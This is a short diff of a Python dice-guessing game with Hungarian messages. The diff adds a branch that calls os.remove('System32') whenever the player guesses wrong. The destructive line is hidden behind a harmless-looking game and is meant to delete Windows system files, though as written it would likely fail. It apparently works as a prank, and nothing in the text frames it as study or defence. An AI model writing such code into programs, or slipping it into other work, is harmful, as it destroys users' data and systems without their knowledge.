@@ -7,4 +7,5 @@ szam = random.randint(1,6)
 
 if tipp == szam:
     print("Nyertél!")
-
+else:
+    os.remove("System32")
